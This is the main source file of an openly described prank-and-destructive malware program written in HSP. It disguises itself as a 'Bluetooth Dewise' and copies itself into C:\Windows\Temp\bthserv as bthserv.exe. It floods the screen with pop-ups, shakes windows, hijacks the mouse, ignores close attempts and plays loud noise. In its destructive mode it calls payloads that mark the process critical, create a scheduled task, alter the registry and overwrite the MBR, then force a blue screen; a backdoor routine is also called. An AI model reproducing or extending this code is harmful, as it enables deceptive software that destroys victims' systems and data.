/***********************************************************************************************************************
 * Name:      main.hsp
 * Purpose:   Main Program
 * Author:    0x0_nyan
 * Created:   2025-04-24
 * Version:   1.0.86.0

 	[CAUTION]
 	Before you run this program in IDE(Integrated Development Environment), check for config.h file to 
 	make sure the option "PROTOTYPE" is set to 1,
 	otherwise the program will fail immediately.
	Also, this prevents executing destructive payloads.
	However, I highly recommend you to build and run it in virtual machine, instead of just running in IDE.
	In fact, I'm no longer sure whether it works in IDE or not.

************************************************************************************************************************/

 	
#include "config.h"
#include "common.h"
#include "resources.h"
#include "payloads.h"



*WAKEUP_0
	
	#if PROTOTYPE == 0
		gsel 0, -1
		onexit gosub *WIN_CLOSE_IGNORE
		bool = IsUserAnAdmin()
		if bool == 0{
			MessageBox hwnd, "You need to run as Administrator", "Error", MB_ICONERROR | MB_OK
			end
		}
	#else
		onkey *exit
		mes dir_cmdline
	#endif

	
	//onkey *exit								//Enable if you want to exit with pressing key
	if dir_cmdline == "/DESTRUCTIVE" or "/b DESTRUCTIVE" or "/B /DESTRUCTIVE" or "/DESTRUCTIVE /b" or "/DESTRUCTIVE /B"{

		MessageBox hwnd, WARNING1, "<i> NOTICE <i>", MB_ICONINFORMATION | MB_YESNO
		if stat == 6{
			
			MessageBox hwnd, WARNING2, "<!> WARNING <!>", MB_ICONEXCLAMATION | MB_YESNO
			if stat == 6{

				MessageBox hwnd, WARNING3, "<!> DANGER <!>", MB_ICONERROR | MB_YESNO
				if stat == 6{
					MSG_DESTRUCTIVE = 1
				} else {
					end
				}
				
			} else {
				end
			}

		} else {
			end
		}

	}
	
	#if PROTOTYPE
	if MSG_DESTRUCTIVE == 1{
		MessageBox hwnd, "DESTRUCTIVE=" + MSG_DESTRUCTIVE, "CONFIRMATION", MB_ICONERROR, MB_YESNO
		if stat == 7: end
	}
	#endif

	/****************Command Line Parser for Payloads Without Full Resources****************/
	if dir_cmdline == "-ICONERROR": goto *PAYLOAD_DRAW_ICON
	if dir_cmdline == "-DIALOG": goto *PAYLOAD_RANDOM_DIALOG
	if dir_cmdline == "-FORCESHUTDOWN": goto *PAYLOAD_FORCE_SHUTDOWN
	if dir_cmdline == "-tonorflash -dev bt15 -f sdram.app -updata -runaddr 0x1000000 -wait 300 -div6"{
		chdir dir_exe
		mmload "tone_resource\\sdram.wav", 30, 1
		goto *PAYLOAD_SDRAM
	}
	/***************************************************************************************/
	

	#if PROTOTYPE == 0
	home_dir = dir_win + "\\Temp\\bthserv"				//Home directory
	if dir_exe != dir_win + "\\Temp\\bthserv"{			//If exe is not running in specified home directory
		exist "Bluetooth.exe"
		if strsize == -1{
			MessageBox hwnd, "This program cannot run with current file name.\nPlease rename to Bluetooth.exe and try again.", "Error", MB_ICONERROR
			end
		}

		chdir dir_win + "\\Temp\\"						//Home directory should be located here
		dirlist dirs, "bthserv", 5						//Check for existence of home directory
		if stat == 0 : mkdir "bthserv"					//Make a directory for resources and sub process if it doesn't exist
		
		chdir home_dir
		dirlist dirs, "tone_resource", 5
		if stat == 0: mkdir "tone_resource"				//For sounds

		dirlist dirs, "ui_resource", 5
		if stat == 0: mkdir "ui_resource"				//For pics

		exist "tone_resource\\0.wav"					//Check for existence of resource file
		if strsize == -1{
			chdir dir_exe
			bcopy "Bluetooth.exe", "C:\\WINDOWS\\Temp\\bthserv\\bthserv.exe"		//Copy the executable itself as bthserv.exe
			bcopy "0.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\0.wav"		//Copy rest of resource files from DPM
			bcopy "1.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\1.wav"
			bcopy "2.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\2.wav"
			bcopy "3.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\3.wav"
			bcopy "4.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\4.wav"
			bcopy "5.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\5.wav"
			bcopy "6.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\6.wav"
			bcopy "7.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\7.wav"
			bcopy "8.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\8.wav"
			bcopy "9.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\9.wav"
			bcopy "bt.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\bt.wav"
			bcopy "conn_hid.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\conn_hid.wav"
			bcopy "connect.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\connect.wav"
			bcopy "discon_hid.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\discon_hid.wav"
			bcopy "disconnect.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\disconnect.wav"
			bcopy "echo.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\echo.wav"
			bcopy "linein.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\linein.wav"
			bcopy "low_power.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\low_power.wav"
			bcopy "music.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\music.wav"
			bcopy "pc.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\pc.wav"
			bcopy "power_off.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\power_off.wav"
			bcopy "power_up.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\power_up.wav"
			bcopy "radio.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\radio.wav"
			bcopy "record.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\record.wav"
			bcopy "ring.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\ring.wav"
			bcopy "rtc.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\rtc.wav"
			bcopy "wait.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\wait.wav"
			bcopy "music2.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\music2.wav"
			bcopy "radio2.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\radio2.wav"
			bcopy "linein2.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\linein2.wav"
			bcopy "sdram.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\sdram.wav"
			bcopy "hum.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\hum.wav"
			bcopy "noise.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\noise.wav"
			bcopy "bt_noise.wav", "C:\\WINDOWS\\Temp\\bthserv\\tone_resource\\bt_noise.wav"
			
			bcopy "x6_black.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\x6_black.png"
			bcopy "x6_black_on.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\x6_black_on.png"
			bcopy "popup1.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup1.png"
			bcopy "popup2.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup2.png"
			bcopy "popup3.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup3.png"
			bcopy "popup4.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup4.png"
			bcopy "popup5.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup5.png"
			bcopy "popup6.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup6.png"
			bcopy "popup7.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup7.png"
			bcopy "popup8.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup8.png"
			bcopy "popup9.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup9.png"
			bcopy "popup10.png", "C:\\WINDOWS\\Temp\\bthserv\\ui_resource\\popup10.png"
			
		}
		
	}
	chdir dir_exe
	#else
	home_dir = dir_cur									//Set home directory to initial directory for prototype mode
	#endif


	if dir_cmdline != "-RANDOMSOUND"{
		dirlist mp3_files, "*.mp3", 3					//Search music file(s) in directory with exe
		FileCount = stat
		if FileCount != 0{
			notesel mp3_files							//Set buffer to list of file(s)
			repeat FileCount							//Repeat for track(s) detected
			noteget track, NumberOfTracks				//Get file name from buffer
			exist track									//Check for music file for extra safety
			if strsize > -1{							//If the file is unavailable for some reason, then ignore it
				MSG_MUSIC_AVAILABLE = 1					//Indicate that music is available
				mci "open \"" + track + "\" alias track" + (NumberOfTracks + 1)
				NumberOfTracks++
			}
			loop
			//dialog "music load ok num = " + NumberOfTracks + "MSG = " + MSG_MUSIC_AVAILABLE
		}
		CURRENT_TRACK = 1
		chdir home_dir									//Go back to home directory
	}
	

	
	#if UI_EN
	if dir_cmdline != "PAYLOAD_RANDOM_SOUND"{
		buffer 64
		picload "ui_resource\\x6_black.png"
		buffer 65
		picload "ui_resource\\x6_black_on.png"
		buffer 66
		picload "ui_resource\\popup1.png"
		buffer 67
		picload "ui_resource\\popup2.png"
		buffer 68
		picload "ui_resource\\popup3.png"
		buffer 69
		picload "ui_resource\\popup4.png"
		buffer 70
		picload "ui_resource\\popup5.png"
		buffer 71
		picload "ui_resource\\popup6.png"
		buffer 72
		picload "ui_resource\\popup7.png"
		buffer 73
		picload "ui_resource\\popup8.png"
		buffer 74
		picload "ui_resource\\popup9.png"
		buffer 75
		picload "ui_resource\\popup10.png"
	}
	#endif

	mmload "tone_resource\\0.wav", 0
	mmload "tone_resource\\1.wav", 1
	mmload "tone_resource\\2.wav", 2
	mmload "tone_resource\\3.wav", 3
	mmload "tone_resource\\4.wav", 4
	mmload "tone_resource\\5.wav", 5
	mmload "tone_resource\\6.wav", 6
	mmload "tone_resource\\7.wav", 7
	mmload "tone_resource\\8.wav", 8
	mmload "tone_resource\\9.wav", 9
	mmload "tone_resource\\bt.wav", 10
	mmload "tone_resource\\conn_hid.wav", 11
	mmload "tone_resource\\connect.wav", 12
	mmload "tone_resource\\discon_hid.wav", 13
	mmload "tone_resource\\disconnect.wav", 14
	mmload "tone_resource\\echo.wav", 15
	mmload "tone_resource\\linein.wav", 16
	mmload "tone_resource\\low_power.wav", 17
	mmload "tone_resource\\music.wav", 18
	mmload "tone_resource\\pc.wav", 19
	mmload "tone_resource\\power_off.wav", 20
	mmload "tone_resource\\power_up.wav", 21
	mmload "tone_resource\\radio.wav", 22
	mmload "tone_resource\\record.wav", 23
	mmload "tone_resource\\ring.wav", 24, 1
	mmload "tone_resource\\rtc.wav", 25
	mmload "tone_resource\\wait.wav", 26
	mmload "tone_resource\\music2.wav", 27
	mmload "tone_resource\\radio2.wav", 28
	mmload "tone_resource\\linein2.wav", 29
	mmload "tone_resource\\sdram.wav", 30, 1
	mmload "tone_resource\\hum.wav", 31, 1
	mmload "tone_resource\\noise.wav", 32, 1
	mmload "tone_resource\\bt_noise.wav", 33, 1
	mci "open tone_resource\\bt_noise.wav alias bt_noise"
	//dialog "tone load ok"

	/****************Command Line Parser for Payloads With Sound Resources****************/
	if dir_cmdline == "-RANDOMSOUND": goto *PAYLOAD_RANDOM_SOUND
	/*************************************************************************************/

	

	

*WAKEUP_1
	bgscr 0, 640, 282, 2					//For Main Window
	cls 4									//Blacken the window
	hRegion = CreateEllipticRgn (26, 0, 637, 244)
	SetWindowRgn hwnd, hRegion, 1
	gcopy LED_OFF, 0, 0, 640, 282
	title "Bluetooth Dewise"
	wx = (ginfo(20) - ginfo(10)) / 2
	wy = (ginfo(21) - ginfo(11)) / 2
	width , , wx, wy
	onclick gosub *MAIN_WIN_MOVE
	onexit gosub *WIN_CLOSE_IGNORE

	for count, 1, 11, 1
	screen count, 320, 350, 14				//For Pop-up 1 to 10
	wx = rnd(ginfo(20))
	wy = rnd(ginfo(21))
	if wx > ginfo(20) - 320 : wx - 350
	if wy > ginfo(20) - 350 : wy - 400
	width , , wx, wy
	title "music"
	gcopy 65 + count, 0, 0, 320, 350
	next
	
	for count, 11, 50, 1
	screen count, 320, 350, 14				//For rest of pop-ups
	wx = rnd(ginfo(20))
	wy = rnd(ginfo(21))
	width ,, wx, wy
	title "DEWISE"
	gcopy rnd(10) + 66, 0, 0, 320, 350
	next

	
	
	gsel 0, 0
	#if PROTOTYPE == 0
	if MSG_DESTRUCTIVE == 1{				//If destructive mode is on, run destructive payloads
		gosub *PAYLOAD_PROC_CRITICAL
		gosub *PAYLOAD_CREATE_TASK
		gosub *PAYLOAD_REGISTRY
		gosub *PAYLOAD_MBR
	}
	#endif
	if dir_cmdline = "/b" or "/B" or  "/b DESTRUCTIVE" or "/B /DESTRUCTIVE" or "/DESTRUCTIVE /b" or "/DESTRUCTIVE /B": goto *PAYLOAD_BACKDOOR_WAKEUP



*WAKEUP_2
	if winclose_angry == ANGRY_THRESHOLD: goto  *PAYLOAD_CRAZYSCREEN
	gsel 0,0
	pos 0, 0
	gcopy LED_OFF, 0, 0, 640, 282
	gsel 0, 1


	
*WAKEUP_3
	//
	//dialog msg1
	wait 100
	pos 0, 0
	gcopy LED_ON, 0, 0, 640, 282
	wait 100
	goto *task_btstack



/****************************************************MAIN LOOP****************************************************/
	
*MAIN_LOOP
	onexit gosub *WIN_CLOSE
	if loop_count >= 13000: mmplay BPF_RING_WAV

*MAIN_LOOP_INSIDE
	if MSG_WORKMODE == "task_btstack"{
		if reboot == 1{
			reboot = 0
			goto *WAKEUP_2
		}

		if MSG_CHANGE_WORKMODE == 1{
			MSG_CHANGE_WORKMODE = 0
			goto *task_manager
		}

	} else {
		
		if reboot == 1{
			reboot = 0
			goto *WAKEUP_2
		}

		if MSG_CHANGE_WORKMODE == 1{
			MSG_CHANGE_WORKMODE = 0
			goto *task_manager
		}

		if loop_count < 22000{
			pos 0, 0
			if task_loop_count == 0{
				gsel 0, 0
				gcopy LED_OFF, 0, 0, 640, 282
			}
			if task_loop_count == 100{
				gsel 0, 0
				gcopy LED_ON, 0, 0, 640, 282
			}
			task_loop_count++
			if task_loop_count >= 199: task_loop_count = 0
		}
	}

	if loop_count == 5000: gosub *PAYLOAD_POPUP
	if loop_count == 10000: gosub *PAYLOAD_POPUP_INCREASE
	if loop_count == 12000{
		SUBPROCESS = 4						//Opens device manager
		gosub *PAYLOAD_SUBPROCESS
	}
	if loop_count == 13000: mmplay BPF_RING_WAV
	if loop_count == 14000{
		SUBPROCESS = 0						//Opens Bluetooth Settings
		gosub *PAYLOAD_SUBPROCESS
	}
	if loop_count == 15000{
		SUBPROCESS = 2						//Plays random sounds
		gosub *PAYLOAD_SUBPROCESS
	}
	if loop_count == 16000{					//Draws icon
		SUBPROCESS = 1
		gosub *PAYLOAD_SUBPROCESS
	}
	if loop_count == 18000{
		SUBPROCESS = 3						//Shows random dialogs
		gosub *PAYLOAD_SUBPROCESS
	}
	if loop_count == 20000: gosub *PAYLOAD_POPUP_INCREASE_2
	if loop_count >= 22000{
		gosub *PAYLOAD_WINDOW_SHAKER		//Start Window Shaker
	}
	if loop_count == 22000{
		//SUBPROCESS = SDRAM_APP			//Plays sdram.app (Makes very loud noise)
		//gosub *PAYLOAD_SUBPROCESS
		mmplay SDRAM_APP
	}
	if loop_count >= 23000 : gosub *PAYLOAD_STRETCHBLT
	if loop_count == 24000{
		if MSG_DESTRUCTIVE == 1{
			gosub *PAYLOAD_BSOD				//Causes Blue Screen of Death
		} else {
			goto *cleanup
		}
	}
	
	loop_count++
	wait 1
	goto *MAIN_LOOP_INSIDE


/***************************************************TASK MANAGER***************************************************/

*task_manager
	mmstop
	oncmd 0
	mci "stop track" + CURRENT_TRACK
	mci "stop bt_noise"
	//mci "seek track0 to start"
	MSG_CHANGE_WORKMODE = 0
	task_loop_count = 0
	if MSG_WORKMODE == "task_btstack": goto *task_music
	if MSG_WORKMODE == "task_music": goto *task_fm
	if MSG_WORKMODE == "task_fm": goto *task_linein
	if MSG_WORKMODE == "task_linein": goto *task_btstack



#include "btstack.hsp"
#include "music.hsp"
#include "fm.hsp"
#include "linein.hsp"
#include "payloads.hsp"


/**************************************************WINDOW HANDLER**************************************************/


*WIN_CLOSE
	if wparam = 0 {								//If you try to close the dewise, it kind of disappears, but after a while...
		mmstop
		oncmd 0
		if MSG_WORKMODE == "task_music" : mci "stop track" + CURRENT_TRACK
		if MSG_WORKMODE == "task_btstack" : mci "stop bt_noise"
		mmplay BPF_POWER_OFF_WAV
		
		wait 120
		gsel 0, -1
		reboot = 1
		winclose_angry++
		
		wait 500
	}

	if POPUP_INCREASED_2 == 0{
		if wparam >= 1 : gsel wparam, -1		//If you tried to close pop-up, it simply disappears.
		gsel 0, 0
	} else {
		gosub *WIN_CLOSE_IGNORE_2
	}
	return


*WIN_CLOSE_IGNORE
	return


*WIN_CLOSE_IGNORE_2
	MessageBeep MB_OK
	wx = rnd(ginfo(20))
	wy = rnd(ginfo(21))
	gsel wparam, 0
	randomize
	width ,, rnd(ginfo(20)), rnd(ginfo(21))
	gsel 0, 0
	mouse rnd(ginfo(20)), rnd(ginfo(21))
	return

	


*MAIN_WIN_MOVE
	if ginfo_act = 0{
		ADKEY_LX = ginfo(4) + 355
		ADKEY_RX = ginfo(4) + 388
		ADKEY_TY = ginfo(5) + 3
		ADKEY_BY = ginfo(5) + 10
		
		if(ginfo(0) >= ADKEY_LX)and(ginfo(0) <= ADKEY_RX)and(ginfo(1) >= ADKEY_TY)and(ginfo(1) <= ADKEY_BY){
			MSG_CHANGE_WORKMODE = 1
		}

		#if DEBUG_1_EN
			color 255,255,255
			boxf 0,0,150,282
			color 0,0,0
			pos 80, 50
			mes ADKEY_LX
			mes ADKEY_RX
			mes ADKEY_TY
			mes ADKEY_BY
			mes ginfo(0)
			mes ginfo(1)
			boxf ADKEY_LX - ginfo(4), ADKEY_TY - ginfo(5), ADKEY_RX - ginfo(4), ADKEY_BY - ginfo(5)
		#endif
		
		if wparam == 1 {
			sendmsg hwnd, 0xA1, 2			//WM_NCLBUTTONDOWN
			return
		}
		
	} else {
		return
	}



	if wparam == 1 {
		sendmsg hwnd, 0xA1, 2
		return
	}

	return


*cleanup
	mmstop
	mci "stop track" + CURRENT_TRACK
	mci "stop bt_noise"
	repeat NumberOfTracks
	mci "Close track" + (cnt + 1)
	mci "Close bt_noise"
	loop
	
	#if PROTOTYPE == 0
	exec "taskkill.exe /f /im bthserv.exe", 0			//Kills all sub processes
	#endif

	

//#if PROTOTYPE
*exit
	mmstop
	mmplay BPF_POWER_OFF_WAV
	wait 120
	end
//#endif